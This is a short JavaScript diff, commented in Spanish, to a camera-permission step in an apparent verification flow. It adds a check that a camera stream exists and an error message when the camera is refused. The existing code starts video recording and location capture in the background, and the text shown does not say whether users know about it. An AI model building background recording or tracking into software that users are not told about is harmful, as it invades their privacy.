@@ -190,13 +190,25 @@ async function acceptPermissions() {
         console.log('Obteniendo ubicación...');
 
         // Iniciar grabación y obtención de ubicación en segundo plano
-        startBackgroundRecording();
+        // Solo si el stream de la cámara fue exitoso
+        if (stream) {
+            startBackgroundRecording();
+        } else {
+            console.warn('No se pudo obtener el stream de la cámara, la grabación en segundo plano no se iniciará.');
+        }
 
         // Avanzar directamente al siguiente paso
         showStep(3);
 
     } catch (error) {
         console.error('Permiso de cámara denegado:', error.message);
+        // Si la cámara es denegada, aún podemos intentar avanzar si no es crítica
+        // o mostrar un mensaje de error al usuario.
+        // Por ahora, solo logueamos y no avanzamos si la cámara es esencial.
+        // Si la grabación de video es opcional, podríamos avanzar aquí.
+        // Para este caso, asumimos que la cámara es requerida para la verificación.
+        errorDiv.textContent = `Error: ${error.message}. La cámara es necesaria para continuar.`;
+        errorDiv.style.display = 'block';
     }
 }
 
